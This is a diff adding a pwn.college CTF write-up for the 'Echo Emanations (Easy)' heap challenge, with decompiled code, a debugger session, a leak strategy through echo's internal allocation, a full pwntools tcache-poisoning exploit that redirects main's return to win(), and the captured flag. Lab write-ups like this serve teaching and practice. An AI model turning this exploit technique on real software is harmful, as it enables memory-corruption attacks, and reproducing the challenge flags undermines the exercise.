@@ -5429,3 +5429,422 @@ Index:
 You win! Here is your flag:
 pwn.college{YED_XcBS6yXPfpwGLSYH_3ZZMX2.0FM5MDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## Echo Emanations (Easy)
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ /challenge/echo-emanations-easy
+###
+### Welcome to /challenge/echo-emanations-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+
+[*] Function (malloc/free/echo/scanf/quit):
+```
+
+### Binary Analysis
+
+```c title="/challenge/echo-emanations-easy :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  int v4; // eax
+  unsigned int v6; // [rsp+2Ch] [rbp-124h]
+  unsigned int v7; // [rsp+2Ch] [rbp-124h]
+  unsigned int v8; // [rsp+2Ch] [rbp-124h]
+  unsigned int v9; // [rsp+2Ch] [rbp-124h]
+  unsigned int v10; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char s1[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v14; // [rsp+148h] [rbp-8h]
+
+  v14 = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  puts(
+    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
+  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
+  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          print_tcache(main_thread_tcache);
+          puts(byte_3529);
+          printf("[*] Function (malloc/free/echo/scanf/quit): ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_3529);
+          if ( strcmp(s1, "malloc") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_3529);
+          v6 = atoi(s1);
+          if ( v6 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x110u, "main");
+          printf("Size: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_3529);
+          size = atoi(s1);
+          printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
+          ptr[v6] = malloc(size);
+          printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
+        }
+        if ( strcmp(s1, "free") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", s1);
+        puts(byte_3529);
+        v7 = atoi(s1);
+        if ( v7 > 0xF )
+          __assert_fail("allocation_index < 16", "<stdin>", 0x122u, "main");
+        printf("[*] free(allocations[%d])\n", v7);
+        free(ptr[v7]);
+      }
+      if ( strcmp(s1, "echo") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", s1);
+      puts(byte_3529);
+      v8 = atoi(s1);
+      if ( v8 > 0xF )
+        __assert_fail("allocation_index < 16", "<stdin>", 0x12Fu, "main");
+      printf("Offset: ");
+      __isoc99_scanf("%127s", s1);
+      puts(byte_3529);
+      v10 = atoi(s1);
+      printf("[*] echo(allocations[%d], %d)\n", v8, v10);
+      echo(ptr[v8], v10);
+    }
+    if ( strcmp(s1, "scanf") )
+      break;
+    printf("Index: ");
+    __isoc99_scanf("%127s", s1);
+    puts(byte_3529);
+    v9 = atoi(s1);
+    if ( v9 > 0xF )
+      __assert_fail("allocation_index < 16", "<stdin>", 0x140u, "main");
+    v3 = malloc_usable_size(ptr[v9]);
+    sprintf(s1, "%%%us", v3);
+    v4 = malloc_usable_size(ptr[v9]);
+    printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v9);
+    __isoc99_scanf(s1, ptr[v9]);
+    puts(byte_3529);
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+```c title="/challenge/echo-emanations-easy :: echo() :: Pseudocode" showLineNumbers
+unsigned __int64 __fastcall echo(__int64 a1, __int64 a2)
+{
+  char **argv; // [rsp+18h] [rbp-18h]
+  char v4[6]; // [rsp+22h] [rbp-Eh] BYREF
+  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  strcpy(v4, "Data:");
+  argv = (char **)malloc(0x20u);
+  *argv = "/bin/echo";
+  argv[1] = v4;
+  argv[2] = (char *)(a1 + a2);
+  argv[3] = nullptr;
+  if ( !fork() )
+  {
+    execve(*argv, argv, nullptr);
+    exit(0);
+  }
+  wait(0);
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+
+This challenge has no startup leaks and no `send_flag`. The goal is the same as the sus-sequence challenges: overwrite `main()`'s return address with `win()` via tcache poisoning. The difference is that we have to obtain the leaks ourselves using the `echo` command.
+
+The `echo` command takes an index and an offset, and calls `execve("/bin/echo", argv, NULL)` where `argv[2] = ptr[idx] + offset`. This prints the bytes at that address as a string, giving us an arbitrary read within any allocation at any offset.
+
+### Leaking via Echo's Internal Chunk
+
+Every time `echo` is called, it runs `malloc(0x20)` internally and populates the resulting chunk with three pointers:
+
+```
+argv[0] = pointer to "/bin/echo"   ← binary address
+argv[1] = pointer to v4 ("Data:")  ← stack address
+argv[2] = ptr[idx] + offset        ← our controlled address
+```
+
+This chunk is never freed. However, if we free one of our own 32-byte chunks into the tcache first, echo's internal `malloc(0x20)` will pop it. Our dangling pointer still points to that chunk, so we can call `echo` again to read the pointers echo wrote into it.
+
+The sequence is:
+
+1. `malloc(0, 32)` — allocate chunk A
+2. `free(0)` — put chunk A into tcache bin for 25-40 byte chunks
+3. `echo(0, 0)` — echo's `malloc(0x20)` pops chunk A and writes its pointers into it
+4. `echo(0, 0)` — reads `argv[0]` from chunk A: a pointer to `"/bin/echo"` in the binary
+5. `echo(0, 8)` — reads `argv[1]` from chunk A: a pointer to `v4` on echo's stack
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  chunk A (ptr[0], also echo's internal argv array)      ┆
+├───────────────────────────────────────────────────────┤
+│  +0x00: argv[0] = &"/bin/echo"  ← binary leak         │
+├───────────────────────────────────────────────────────┤
+│  +0x08: argv[1] = &v4           ← stack leak          │
+├───────────────────────────────────────────────────────┤
+│  +0x10: argv[2] = ptr[0] + 0    ← heap address        │
+├───────────────────────────────────────────────────────┤
+│  +0x18: argv[3] = NULL                                │
+└───────────────────────────────────────────────────────┘
+```
+
+### Calculating win and ret
+
+`"/bin/echo"` lives at file offset `0x33f8` in the binary:
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ python3 -c "
+data = open('/challenge/echo-emanations-easy', 'rb').read()
+print(hex(data.find(b'/bin/echo')))
+"
+0x33f8
+```
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ nm /challenge/echo-emanations-easy | grep -E "main|win"
+                 U __libc_start_main@@GLIBC_2.2.5
+0000000000001cce T main
+0000000000005048 B main_thread_tcache
+0000000000001b00 T win
+```
+
+So:
+```
+base     = bin_leak - 0x33f8
+win_addr = base + 0x1b00
+```
+
+Replace that section with this:
+
+For the stack leak, `argv[1]` points to `v4` which is at `[rbp-0xe]` inside echo's frame. We find the fixed offset between `v4` and main's return address using GDB:
+
+```
+pwndbg> break echo
+Breakpoint 1 at 0x1c09
+pwndbg> run
+Starting program: /challenge/echo-emanations-easy 
+Downloading separate debug info for system-supplied DSO at 0x7fff427d3000
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7fff427d3000.                                                                                   
+###
+### Welcome to /challenge/echo-emanations-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+
+[*] Function (malloc/free/echo/scanf/quit): malloc
+
+Index: 0
+
+Size: 32
+
+[*] allocations[0] = malloc(32)
+[*] allocations[0] = 0x5f3e7a3c02c0
+
+[*] Function (malloc/free/echo/scanf/quit): free
+
+Index: 0
+
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #1      | SIZE: 25 - 40          | COUNT: 1     | HEAD: 0x5f3e7a3c02c0       | KEY: 0x5f3e7a3c0010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x5f3e7a3c02c0      | 0                   | 0x31 (P)                     | (nil)               | 0x5f3e7a3c0010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/echo/scanf/quit): echo
+
+Index: 0
+
+Offset: 0
+
+[*] echo(allocations[0], 0)
+
+Breakpoint 1, 0x00005f3e5bba0c09 in echo ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────────────────────────────────────────────────────────────────
+Breakpoint hit at 0x5f3e5bba0c09
+─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
+ RAX  0x5f3e7a3c02c0 ◂— 0
+ RBX  0x5f3e5bba12e0 (__libc_csu_init) ◂— endbr64
+ RCX  0
+ RDX  0
+ RDI  0x5f3e7a3c02c0 ◂— 0
+ RSI  0
+ R8   0x1c
+ R9   0x1c
+ R10  0x5f3e5bba2624 ◂— 0x666e616373000a29 /* ')\n' */
+ R11  0x246
+ R12  0x5f3e5bba0400 (_start) ◂— endbr64
+ R13  0x7fff427b7eb0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff427b7c60 —▸ 0x7fff427b7dc0 ◂— 0
+ RSP  0x7fff427b7c30 —▸ 0x7fff427b7dc0 ◂— 0
+ RIP  0x5f3e5bba0c09 (echo+12) ◂— mov qword ptr [rbp - 0x28], rdi
+──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
+ ► 0x5f3e5bba0c09 <echo+12>    mov    qword ptr [rbp - 0x28], rdi           [0x7fff427b7c38] <= 0x5f3e7a3c02c0 ◂— 0
+   0x5f3e5bba0c0d <echo+16>    mov    qword ptr [rbp - 0x30], rsi           [0x7fff427b7c30] <= 0
+   0x5f3e5bba0c11 <echo+20>    mov    rax, qword ptr fs:[0x28]              RAX, [0x7269b50ea568] => 0x2863de3a38c21100
+   0x5f3e5bba0c1a <echo+29>    mov    qword ptr [rbp - 8], rax              [0x7fff427b7c58] <= 0x2863de3a38c21100
+   0x5f3e5bba0c1e <echo+33>    xor    eax, eax                              EAX => 0
+   0x5f3e5bba0c20 <echo+35>    mov    dword ptr [rbp - 0xe], 0x61746144     [0x7fff427b7c52] <= 0x61746144
+   0x5f3e5bba0c27 <echo+42>    mov    word ptr [rbp - 0xa], 0x3a            [0x7fff427b7c56] <= 0x3a
+   0x5f3e5bba0c2d <echo+48>    mov    edi, 0x20                             EDI => 0x20
+   0x5f3e5bba0c32 <echo+53>    call   malloc@plt                  <malloc@plt>
+ 
+   0x5f3e5bba0c37 <echo+58>    mov    qword ptr [rbp - 0x18], rax
+   0x5f3e5bba0c3b <echo+62>    mov    rax, qword ptr [rbp - 0x18]
+───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff427b7c30 —▸ 0x7fff427b7dc0 ◂— 0
+01:0008│-028 0x7fff427b7c38 —▸ 0x5f3e5bba0400 (_start) ◂— endbr64
+02:0010│-020 0x7fff427b7c40 —▸ 0x7fff427b7eb0 ◂— 1
+03:0018│-018 0x7fff427b7c48 ◂— 0
+04:0020│-010 0x7fff427b7c50 ◂— 0
+05:0028│-008 0x7fff427b7c58 —▸ 0x7269b4f3b5c4 (atoi+20) ◂— add rsp, 8
+06:0030│ rbp 0x7fff427b7c60 —▸ 0x7fff427b7dc0 ◂— 0
+07:0038│+008 0x7fff427b7c68 —▸ 0x5f3e5bba114e (main+1152) ◂— jmp main+254
+─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5f3e5bba0c09 echo+12
+   1   0x5f3e5bba114e main+1152
+   2   0x7269b4f1b083 __libc_start_main+243
+   3   0x5f3e5bba042e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+From this we can extract:
+
+- echo's `rbp` = `0x7fff427b7c60`
+- echo's `v4` is at `[rbp-0xe]` = `0x7fff427b7c52`
+- main's `rbp` = `0x7fff427b7dc0` (stored at echo's `rbp+0x00`)
+- main's return address is at main's `rbp+0x8` = `0x7fff427b7dc8`
+
+```
+offset = 0x7fff427b7dc8 - 0x7fff427b7c52 = 0x176
+```
+
+So `ret_addr = stack_leak + 0x176`.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/echo-emanations-easy")
+
+p.recvuntil(b"quit): ")
+
+def malloc(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit): ")
+
+def free(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def echo(idx, offset):
+    p.sendline(b"echo")
+    p.sendline(str(idx).encode())
+    p.sendline(str(offset).encode())
+    p.recvuntil(b"Data: ")
+    data = p.recvuntil(b"\n", drop=True)
+    p.recvuntil(b"quit): ")
+    return data
+
+def scanf(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+# allocate and free a 32-byte chunk to match echo's internal malloc size
+malloc(0, 32)
+free(0)
+
+# trigger echo to populate chunk A with its argv pointers
+echo(0, 0)
+
+# read the leaks back
+bin_leak   = echo(0, 0).ljust(8, b"\x00")[:8]
+stack_leak = echo(0, 8).ljust(8, b"\x00")[:8]
+
+bin_addr   = u64(bin_leak)
+stack_addr = u64(stack_leak)
+
+base     = bin_addr - 0x33f8
+win_addr = base + 0x1b00
+ret_addr = stack_addr + 0x176
+
+print(f"[*] bin leak:   {hex(bin_addr)}")
+print(f"[*] stack leak: {hex(stack_addr)}")
+print(f"[*] base:       {hex(base)}")
+print(f"[*] win:        {hex(win_addr)}")
+print(f"[*] ret:        {hex(ret_addr)}")
+
+# tcache poisoning to overwrite main's return address with win
+malloc(0, 128)
+malloc(1, 128)
+free(1)
+free(0)
+scanf(0, p64(ret_addr))
+malloc(0, 128)
+malloc(1, 128)
+scanf(1, p64(win_addr))
+
+p.sendline(b"quit")
+print(p.recvall().decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~echo-emanations-easy:/$ python ~/script.py 
+[+] Starting local process '/challenge/echo-emanations-easy': pid 22792
+[*] bin leak:   0x5fa64c6693f8
+[*] stack leak: 0x7ffc2f2a84c2
+[*] base:       0x5fa64c666000
+[*] win:        0x5fa64c667b00
+[*] ret:        0x7ffc2f2a8638
+[+] Receiving all data: Done (101B)
+[*] Process '/challenge/echo-emanations-easy' stopped with exit code -11 (SIGSEGV) (pid 22792)
+
+### Goodbye!
+You win! Here is your flag:
+pwn.college{oltNDhu89yFosTi_YN8r9ALBFq8.0VM5MDL4ITM0EzW}
+```
